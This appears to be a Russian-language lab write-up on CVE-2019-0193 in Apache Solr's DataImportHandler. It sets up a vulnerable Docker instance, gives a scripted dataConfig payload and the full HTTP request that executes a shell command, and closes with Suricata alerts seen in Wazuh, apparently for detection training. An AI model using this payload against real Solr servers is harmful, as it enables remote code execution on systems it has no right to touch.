# CVE-2019-0193

### Материалы:

* [https://nvd.nist.gov/vuln/detail/CVE-2019-0193](https://nvd.nist.gov/vuln/detail/CVE-2019-0193)
* [https://www.opencve.io/cve/CVE-2019-0193](https://www.opencve.io/cve/CVE-2019-0193)

В Apache Solr DataImportHandler, необязательный, но популярный модуль для получения данных из баз данных и других источников, имеет функцию, благодаря которой вся конфигурация DIH может быть получена из запроса параметра «dataConfig». \[Режим отладки экрана администратора DIH использует это для удобной отладки/разработки конфигурации DIH.&#x20;

Поскольку конфигурации DIH могут содержать сценарии, злоумышленники могут создавать опасные запросы, которые могут привести к удаленному выполнению команд.

### Эксплуатация уязвимости

Для запуска уязвимой среды выполните команды:

```
docker compose up -d
docker compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db
```

После запуска и создания нового ядра 'test' по адресу http://ваш-ip:8983 будет доступна веб-страница Apache Solr

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

Перейдите на вкладку с новым ядром, затем dataimport -> Debug-Mode и вставьте следующую полезную нагрузку:

```
<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("touch /tmp/success");
          }
  ]]></script>
  <document>
    <entity name="stackoverflow"
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" />
  </document>
</dataConfig>
```

Затем нажмите кнопку `Execute with this Configuration`&#x20;

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

После этого отправьте следующий запрос для успешной реализации уязвимости:

```
POST /solr/test/dataimport?_=1565835261600&indent=on&wt=json HTTP/1.1
Host: ваш-ip:8983
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: csrftoken=nNI9Q2RFGsJwDdNGaP5HHbW94e3aIVlTBNoKw9DjUnmRikDe4kOOEcTdK6mFnkc8
Upgrade-Insecure-Requests: 1
Content-type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://ваш-ip:8983/solr/
Content-Length: 683

command=full-import&verbose=false&clean=false&commit=true&debug=true&core=test&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport

```

> Перед отправкой замените csrf-токен на ваш собственный

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

После отправки запроса был создан файл /tmp/success

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

В Wazuh (https://ваш-ip/app/wazuh) мы можем увидеть соответствующие алерты от IDS Suricata об эксплуатации данной уязвимости.

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
